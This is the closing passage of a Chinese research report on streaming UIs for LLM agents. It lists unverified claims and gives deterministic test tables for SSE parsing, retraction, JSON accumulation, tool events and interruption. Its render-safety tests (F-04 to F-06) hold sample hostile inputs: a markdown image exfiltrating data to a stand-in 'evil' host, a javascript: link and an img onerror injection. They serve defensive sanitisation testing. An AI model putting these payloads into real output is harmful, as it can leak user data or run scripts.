常见说法（20–40 字符/秒、跟随实际 token 速率、加一个平滑缓冲）我找不到任何一手实验依据。Tombaugh 1985 只能支持「太慢有害」的方向，**不能反推最优速率**。
→ 只能肉眼验收（见第 10 节）。

**NF-7 · 「骨架屏 / 占位符比 spinner 好」在 agent 场景的依据**
Myers 1985 支持的是**百分比进度指示器**（INV-40 `[P]`），而 agent 任务通常无法给出百分比。骨架屏 vs spinner 在 agent 长等待场景的对比数据，我没找到一手来源。
→ 见第 10 节，只能肉眼验收。

**NF-8 · 「让用户看到 thinking 能提升信任」**
这是一个到处在说的结论。我找不到任何厂商的公开数据。**反而**有一手证据表明它是有成本的（INV-32：TTFT 变慢 `[P]`）和有上限的（INV-30：你永远拿不到 raw CoT `[P]`）。
→ 未证实。

### 9.3 传输层类

**NF-9 · 「AWS ALB 会缓冲响应，需要关闭」**
**我在 AWS 官方文档中找不到 ALB 的 response buffering 属性。** ALB 属性文档里列出的相关项是 `idle_timeout.timeout_seconds`（默认 60）和客户端 keepalive，**没有 buffering 开关**。
→ ALB 上 SSE 的真实风险是**空闲超时**（INV-17 `[P]`），不是缓冲。**这条说法应该在课上被明确纠正。**

**NF-10 · Vercel / Cloudflare 生产环境「是否缓冲 SSE」的正式声明**
我拿到的一手材料是 **workerd/Miniflare 的行为**（INV-14 `[P]` / `[P2]`），以及一条维护者评论说生产环境对 `text/event-stream` 不压缩 `[P2]`。
**我没有找到一份「生产平台不缓冲 SSE」的官方承诺文档。**
→ 结论只能是：**本地和生产行为不同，必须在部署环境实测。** 这本身是个可教的方法论。

**NF-11 · OpenAI 在客户端断连后是否继续生成 / 是否继续计费**
Anthropic 明确说会计费已生成的 token（INV-37 `[P]`）。**OpenAI 侧我找不到对应的明文。**
有一手依据的只有：只有 `background: true` 的响应可以取消（`[P]`）—— 这**暗示**非后台响应的取消语义是不同的，但我不能替它下结论。
→ 标为未证实。

**NF-12 · `Last-Event-ID` 在主流 LLM API 上是否被支持**
OpenAI / Anthropic 的流式文档中**都没有提到** `Last-Event-ID`。它们的事件里也没有单调递增的 `id:` 字段（Anthropic 用 `index`，OpenAI 用 `sequence_number`，**都不是 SSE 的 `id:` 字段**）。
→ **推论**：厂商 API 层面不支持 SSE 原生续传 `[P2]`。这正好解释了为什么 Vercel 要自己建一套（INV-12）。**但「厂商明确不支持」这句话我没有一手引用。**

### 9.4 产品 UI 类

**NF-13 · Cursor Cloud Agents / Claude Code / Codex 的后台 agent UI 细节**
通知机制、并行 agent 的视觉组织、审批点的具体呈现 —— 我没有拿到足以逐字引用的一手产品文档（INV-47 / F.3）。
→ 能确证的只有 Cursor changelog 的 "Ask Every Time is deprecated" `[P]`。

**NF-14 · 「渲染不可信模型输出」的正式安全规范**
**我没有找到任何厂商或标准组织发布的、可引用的「LLM 输出渲染安全要求」规范文档。** E.2 的清单是从一手事实推导的 `[P2]`。
→ 这是一个**真实的行业空白**，可以在课上作为「所以你得自己想清楚」的论点。

**NF-15 · Claude Code `auto` 是否为默认权限模式、Codex `auto_review` 的具体语义**
我手上的材料支持「这两个东西存在」，但**没有拿到一句完整的逐字引用**确认默认值和语义。标 `[P2]`（INV-46 / G.1）。

---

## 10. 建议的实验设计

> **本课程硬约束：verify 一次模型都不调。**
> 下面把「能写成确定性断言的」和「只能肉眼看的」彻底分开。

### 10.1 总判定

用户点名的四件事，判定如下：

| 事项 | 能否零模型调用确定性测试 | 理由 |
|---|---|---|
| **SSE 分帧解析** | ✅ **完全可以** | 规范给出了封闭的解析规则集（A.1 的 12 条），输入是固定字节串，输出是事件序列。纯函数。 |
| **撤回状态机** | ✅ **完全可以** | `reset-step` / `abort` / `max_tokens` 的语义由协议定义，输入是固定事件序列，输出是渲染缓冲区状态。纯状态机。 |
| **流式 JSON 累积** | ✅ **完全可以** | 累积契约是官方三步算法（INV-25），snapshot 与 parse 边界都可断言，包括「非法 JSON」路径。 |
| **并行工具事件归位** | ✅ **完全可以** | 归位键是显式字段（`index` / `output_index`），交错序列可以手写。纯 reducer。 |

**四件事全部可以做成确定性测试。** 这是本节在课程中的一大优势 —— 它是少见的「前端 + 完全可测」的组合。

### 10.2 断言清单 A：SSE 分帧解析（`parseSSE(bytes) → Event[]`）

被测单元：一个纯函数（或一个 `TransformStream`），输入 `Uint8Array`/字符串块序列，输出事件对象序列。

| ID | 输入 | 断言 | 依据 |
|---|---|---|---|
| A-01 | `"data: a\n\n"` | 1 个事件，`data === "a"`，`event === "message"` | 规范示例 |
| A-02 | `"data: a\r\n\r\n"` | 同 A-01（CRLF） | 三种行结束符 |
| A-03 | `"data: a\r\r"` | 同 A-01（纯 CR） | 三种行结束符 |
| A-04 | `"data: a\r\ndata: b\n\n"` | 1 个事件，`data === "a\nb"`（**混用行结束符**） | 三种可混用 |
| A-05 | `"data: a\n"`（无空行结尾） | **0 个事件** | "the incomplete event is not dispatched" |
| A-06 | `"data:a\n\n"` vs `"data: a\n\n"` | **两者 `data` 相同** | "the space after the colon is ignored" |
| A-07 | `"data:  a\n\n"`（两个空格） | `data === " a"`（**保留第二个空格**） | 只忽略一个 |
| A-08 | `"data: a\ndata: b\ndata: c\n\n"` | `data === "a\nb\nc"` | LF 拼接 + 去尾 LF |
| A-09 | `"data\n\n"`（无冒号） | 1 个事件，`data === ""` | 无冒号行值为空串 |
| A-10 | `": comment\ndata: a\n\n"` | 1 个事件（注释被忽略） | `:` 开头忽略 |
| A-11 | `"event: foo\ndata: a\n\n"` | `event === "foo"` | `event:` 字段 |
| A-12 | `"id: 1\ndata: a\n\nid:\ndata: b\n\n"` | 事件1 `lastEventId==="1"`；事件2 `lastEventId===""` | 空 `id:` 重置 |
| A-13 | `"id: 1\ndata: a\n\ndata: b\n\n"` | **两个事件的 `lastEventId` 都是 `"1"`** | last event ID 粘性 |
| A-14 | `"id: a\u0000b\ndata: x\n\n"` | `id` 字段被忽略，`lastEventId === ""` | 含 NULL 则忽略 |
| A-15 | `"retry: 3000\ndata: a\n\n"` | `retry === 3000` | ASCII 数字 |
| A-16 | `"retry: 3000ms\ndata: a\n\n"` | **retry 未被设置**（保持原值） | 非数字静默忽略 |
| A-17 | `"retry: -1\n\n"` / `"retry: 3.5\n\n"` | 同 A-16 | 非 ASCII 数字 |
| A-18 | `"foo: bar\ndata: a\n\n"` | 未知字段被忽略，事件正常 | "The field is ignored." |
| A-19 | **任意随机切割点**（把 A-01…A-18 的输入在每个字节位置切成两块喂进去） | 输出与不切割时**完全一致** | INV-16（CDN 重新分帧） |
| A-20 | `"event: ping\ndata:\n\n"`（空 data） | **不抛异常**；上层跳过而非 `JSON.parse("")` | Anthropic SDK PR #903 |
| A-21 | UTF-8 多字节字符被切在中间 | 正确重组，不产生替换字符 | "Event streams are always decoded as UTF-8" |
| A-22 | 10000 个事件的流 | 无二次方复杂度（设一个时间上限） | 工程要求 |

**A-19 是这一组里最有教学价值的一条**：它把「转发不是搬运」变成了一个可以运行的测试。做法是一个属性测试（property-based test）：对每个输入，穷举所有切割点，断言结果不变。**这一条能同时抓住 A-01 到 A-18 的所有实现漏洞。**

### 10.3 断言清单 B：撤回状态机（`reduce(state, event) → state`）

被测单元：渲染缓冲区的 reducer，输入固定的 chunk 序列，输出「当前应该渲染的 parts 列表」。

| ID | 输入事件序列 | 断言 | 依据 |
|---|---|---|---|
| B-01 | `start-step`, `text-delta(a)`, `text-delta(b)`, `finish-step` | parts 为一个 text part，内容 `"ab"` | AI SDK 协议 |
| B-02 | `start-step`, `text-delta(a)`, `reset-step` | **parts 为空** | "Removes all message parts added during the current step" |
| B-03 | `start-step`, `text-delta(a)`, `finish-step`, `start-step`, `text-delta(b)`, `reset-step` | parts 只剩第一步的 `"a"` | "since the most recent start-step part" |
| B-04 | `text-delta(a)`, `reset-step`（**无** step 边界） | **parts 为空** | "If there is no step boundary, it removes all parts from the current message" |
| B-05 | `start-step`, `tool-input-start`, `tool-input-delta`, `reset-step` | 工具调用槽位**也被移除** | "all message parts" |
| B-06 | `start-step`, `text-delta(a)`, `reset-step`, `text-delta(b)`, `finish-step` | parts 为 `"b"`（撤回后可继续写入） | 重试场景 |
| B-07 | `start-step`, `text-delta(a)`, `abort` | parts 保留 `"a"`，且状态标记为 aborted | `abort` part + "Persist the latest partial assistant message" |
| B-08 | `abort` 之后再来 `text-delta` | **被忽略**（终态） | `[P2]` 推导；aborted 是终态 |
| B-09 | `reset-step` 连续两次 | 幂等，不抛异常 | 工程要求 |
| B-10 | 未知 chunk 类型 `{type:"future-thing"}` | **不抛异常**，被忽略 | `z.looseObject` / "handle unknown event types gracefully" |
| B-11 | chunk 带未知额外字段（如 `obfuscation`） | **正常处理** | INV-20 / INV-26 |
| B-12 | `text-delta` 携带未见过的 `id` | 创建新 part，不是追加到旧 part | `text-delta` 有 `id` 字段 |

**B-04 和 B-10 是最容易写错的两条。** B-04 因为它是一个「无边界」的边界情况；B-10 因为「严格校验」是前端的本能美德，而在这里是 bug（INV-20 有真实崩溃案例）。

### 10.4 断言清单 C：流式 JSON 累积（`accumulate(deltas) → {snapshot, final}`）

| ID | 输入 | 断言 | 依据 |
|---|---|---|---|
| C-01 | `start(input={})`, `delta('{"a":')`, `delta('1}')`, `stop` | `final` 为对象 `{a:1}` | 三步累积契约 |
| C-02 | 同上，在 `delta('{"a":')` 之后检查 | **`canExecute === false`**（未到 `stop`） | 只有 stop 后可执行 |
| C-03 | 同上，在 `stop` 之后检查 | `canExecute === true` | 同上 |
| C-04 | `start`, `delta('{"a":')`, `stop`（非法 JSON） | **不抛异常**；状态为 `ARGS_INVALID` | "the accumulated string might not be valid JSON" |
| C-05 | C-04 之后 | 产出的 tool result 形如 `{"INVALID_JSON": "{\"a\":"}`，**且用 JSON 库构造**（引号被正确转义） | "Build the wrapper with your JSON library rather than by concatenating strings" |
| C-06 | `start`, `delta`, `message_delta(stop_reason="max_tokens")` | 状态为 `TRUNCATED`，`canExecute === false`，**且触发撤回** | "A response that ends with the stop reason max_tokens can also cut a parameter off midway" |
| C-07 | `start(input={})` 后立即检查 | 不把 `{}` 当成参数初始值；类型不混淆 | "This is a placeholder" / 类型不一致 by design |
| C-08 | `delta('{"path": "src/a.tsx"')` | snapshot 暴露已完整的 `path` 字段（可展示） | SDK `event.snapshot` |
| C-09 | delta 序列在**任意点**被切成更小的片段 | 最终结果不变 | 分帧无关性 |
| C-10 | 空 delta 序列（`start` 后直接 `stop`） | `final` 为 `{}`，不抛异常 | 零 delta 是合法的（fallback block） |
| C-11 | delta 中含 UTF-8 多字节字符被切断 | 正确重组 | 工程要求 |

**C-05 是一条很少有人会想到要测的断言**，但它是官方明文要求的，而且「字符串拼接构造 JSON」是一个会在含引号输入上炸掉的经典 bug。

### 10.5 断言清单 D：并行工具事件归位（`reduce(events) → Map<key, ToolCall>`）

| ID | 输入 | 断言 | 依据 |
|---|---|---|---|
| D-01 | 两个 tool call，事件**完全交错**（index 0/1 的 delta 交替） | 两个参数各自正确，**没有串台** | `index` 归位 |
| D-02 | 三个 tool call，随机交错顺序 | 全部正确 | 同上 |
| D-03 | OpenAI 形态：按 `output_index` 归位，`sequence_number` 乱序到达 | 按 `sequence_number` 重排后正确 | `sequence_number` 字段 |
| D-04 | 只有一个 tool call（index 0） | 与 D-01 用同一套代码路径 | 避免「单调用特例」 |
| D-05 | 一个 tool call 的 `stop` 先到，另一个还在流 | 第一个进入 `ARGS_READY`，第二个仍 `STREAMING_ARGS` | 独立状态机 |
| D-06 | `content_block_start`+`content_block_stop` **零 delta**（fallback block） | **不被当成 tool call**；识别为模型边界 | INV-21 |
| D-07 | 文本 block（index 0）与 tool block（index 1）交错 | 文本和参数各自正确 | 同一个 index 空间 |
| D-08 | 同一个 index 被复用（前一个已 stop） | 不覆盖已完成的调用 | `[P2]` 工程要求 |

**D-01 是本节最重要的单条测试。** 一个用单一累加器的实现会在这里立刻失败，而这个 bug 在只有一个工具调用时**完全不可见** —— 所以 D-04 存在的意义是防止学员写出「单调用特例分支」。

### 10.6 断言清单 E：中断语义（可确定性测试）

| ID | 场景 | 断言 | 依据 |
|---|---|---|---|
| E-01 | 组件卸载 | **不调用** stop 端点 | "Do not call the stop endpoint from route cleanup code" |
| E-02 | 页面 unload | **不调用** stop 端点 | "page unloads … should remain resumable" |
| E-03 | 用户点停止 | 调用 stop 端点**恰好一次** | 显式取消需独立信号 |
| E-04 | 连续点停止 3 次 | abort 幂等，不抛异常 | "If signal is aborted, then return." |
| E-05 | `AbortSignal.any([user, timeout])`，timeout 先触发 | `signal.reason` 能区分原因 | `reason` getter |
| E-06 | 中断后构造下一轮请求体 | **末尾不是 assistant message** | prefill 已不支持，会 400 |
| E-07 | 中断后构造下一轮请求体 | 历史中的 thinking 块**逐字节相同**（含 `signature`、含 `redacted_thinking`） | "complete and unmodified" / 400 错误的最常见原因是按 type 过滤 |
| E-08 | 对历史做客户端压缩后 | 断言**没有**做（或断言 thinking 块被完整保留） | INV-34：客户端压缩破坏签名绑定 |

**E-07 是一条「断言你没做某件事」的测试，形式上不常见但非常必要** —— 它防的正是 `messages.map(...)` 这个前端标准操作。

### 10.7 断言清单 F：无障碍与渲染安全（可确定性测试）

| ID | 场景 | 断言 | 依据 |
|---|---|---|---|
| F-01 | 流式期间 | 容器 `aria-busy === "true"` | ARIA：`aria-busy` 用于「多部分加载完成前」 |
| F-02 | 流结束 | 容器 `aria-busy === "false"` | 同上 |
| F-03 | 容器属性 | `aria-live === "polite"`（**不是** assertive） | assertive "potentially clearing the speech queue" |
| F-04 | 固定 markdown 输入含外部图片 `![](http://evil/?d=x)` | **不发起网络请求**（或 src 被重写为代理） | `[P2]`（NF-14：无正式规范，推导） |
| F-05 | 固定输入含 `[x](javascript:alert(1))` | href 被清理 | `[P2]` |
| F-06 | 固定输入含 raw HTML `<img onerror=...>` | 不产生该元素 | `[P2]` |
| F-07 | 工具结果（非模型文本）走同一条清理路径 | 断言清理函数被调用 | `[P2]`：工具结果同样不可信 |

F-01…F-03 的属性语义有一手依据（`[P]`），**组合方式**是推导（`[P2]`）。F-04…F-07 全部是 `[P2]`，因为 NF-14：没有正式规范可引。**课上要如实标注。**

### 10.8 只能靠肉眼看的部分

以下**不要**试图写成断言 —— 没有一手依据支撑任何具体阈值，写出来的断言会是伪科学。

| 项目 | 为什么只能肉眼看 | 相关「查不到」 |
|---|---|---|
| 打字机效果的速度是否舒适 | 无最优速率的一手依据；Tombaugh 只支持「太慢有害」的方向 | NF-6 |
| 流式输出是否「感觉更快」 | **没有任何厂商 A/B 数据** | NF-5 |
| 骨架屏 vs spinner 在 agent 长等待下哪个好 | Myers 支持的是百分比进度，而 agent 无百分比 | NF-7 |
| thinking 展示是否提升信任 | 无数据；且有 TTFT 成本 | NF-8 |
| diff 预览的视觉密度、配色、折叠策略 | 纯视觉设计，无规范 | — |
| 工具调用卡片的信息层级 | 同上 | — |
| 「正在思考」文案的措辞 | 同上 | — |
| 多 agent 并行时的视觉组织 | 无一手产品文档 | NF-13 |

**建议的肉眼验收方式**：录一段固定的、离线的事件流（就是 10.2–10.5 用的那些 fixture），用它驱动 UI 回放。**这样即使是肉眼验收，也是可重复的，而且仍然零模型调用。** 这是本节一个值得单独讲的方法论 —— **把「不可自动断言」和「不可重复」区分开**。

### 10.9 实验基础设施建议

一个贯穿本节的核心工件：**一组离线的 SSE fixture 文件**。

```
fixtures/
  sse/                  # 原始字节，用于清单 A
    crlf.txt  lf.txt  cr.txt  mixed.txt
    no-trailing-blank.txt
    empty-data-event.txt      # 复现 Anthropic PR #903
    obfuscation-field.txt     # 复现 INV-26 / zed #52504
  anthropic/            # 真实形态的事件序列，用于清单 C/D
    tool-single.jsonl
    tool-parallel-interleaved.jsonl
    tool-invalid-json.jsonl
    tool-max-tokens-truncated.jsonl
    thinking-omitted.jsonl    # 只有 signature_delta，无 thinking_delta
    fallback-boundary.jsonl   # 零 delta 的 fallback block
  ai-sdk/               # 用于清单 B
    reset-step-no-boundary.jsonl
    reset-step-after-step.jsonl
    abort-midstream.jsonl
    tool-approval-request.jsonl
```

配一个**随机切割器**（把任意 fixture 按随机字节边界切成 N 块）—— 这一个工具就把 A-19、C-09、C-11、A-21 全部覆盖了，而且它是「转发不是搬运」这个论点的可执行版本。

**这套 fixture 的价值超出本节**：它让整门课的前端部分可以在完全离线、零成本、确定性的条件下开发和测试。

---

## 附：欠条结算

| 欠条 | 结算情况 |
|---|---|
| **1. 已渲染的内容如何撤回** | ✅ **协议层有官方对应物**：AI SDK `reset-step`（INV-19，源码 + 文档双一手引用）。可完全确定性测试（清单 B，12 条断言）。 |
| **2. 转发流时中间层缓冲** | ✅ **四类失败模式全部有一手依据**：nginx 默认 `proxy_buffering on`（INV-15）、workerd gzip/br 不支持流式（INV-14）、CDN 重新分帧导致崩溃（INV-16，Anthropic SDK 真实修复）、ALB 60 秒空闲超时（INV-17）。规范自身有告警（"HTTP chunking can have unexpected negative effects"）。可确定性测试（A-19 随机切割）。附带纠正一条流传说法（NF-9：ALB 没有 buffering 开关）。 |
| **3. 工具调用的可视化 / diff 预览** | ✅ **「安全展示」边界有官方三层定义**（INV-25），并行归位有显式字段（INV-27）。**且 G.2 给出了一个更强的结论：diff 预览比审批弹窗的生命周期长**（INV-46：Cursor 已弃用 Ask Every Time）。可完全确定性测试（清单 C + D，19 条断言）。 |
| **4. 等待期体验设计** | ⚠️ **部分结算**。有一手依据的：Miller / Nielsen 的准确数字（INV-39，纠正了一条流传极广的错误归因）、Myers 的真实结论（INV-40）、Tombaugh 的反向证据（INV-41）、`display: "omitted"` 的 TTFT 影响（INV-32）、`display: "updates"` 这个专为等待期造的 API（INV-31）、OpenTelemetry 的标准指标名（INV-42）、ARIA 的流式模式（INV-43，可确定性测试）。**查不到依据的：流式是否提升满意度（NF-5）、最优打字机速度（NF-6）、骨架屏 vs spinner（NF-7）、thinking 提升信任（NF-8）—— 这四条必须在课上标为未证实。** |

---

*报告结束。所有引文保留英文原文。所有一手引用均标注来源与访问日期 2026-09-15。`[S]` 标记仅出现在 NF-1、NF-2、NF-4 与 INV-35 末尾的线索性引用中，未用于任何数字或结论。*


